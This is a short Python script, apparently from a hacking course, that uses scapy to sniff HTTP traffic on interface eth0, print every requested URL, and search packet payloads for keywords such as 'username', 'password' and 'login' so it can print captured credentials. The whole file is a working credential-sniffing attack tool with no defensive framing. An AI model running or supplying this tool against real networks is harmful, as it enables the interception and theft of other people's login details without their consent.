#!/usr/bin/env python

import scapy.all as scapy
from scapy.layers import http


def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=process_sniffed_package)


def get_url(packet):
    return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path


def get_login_info(packet):
    if packet.haslayer(scapy.Raw):
        load = packet[scapy.Raw].load
        keywords = ["username", "user", "usuario", "password", "pass", "login", "autentication", "logon"]
        for keyword in keywords:
            if keyword in load:
                return load


def process_sniffed_package(packet):
    if packet.haslayer(http.HTTPRequest):
        url = get_url(packet)
        print ("[+] Htpp Request >> " + url)

        login_info = get_login_info(packet)
        if login_info:
            print ("\n\n[+] Possible Username/Password >> " + login_info + "\n\n")


sniff("eth0")


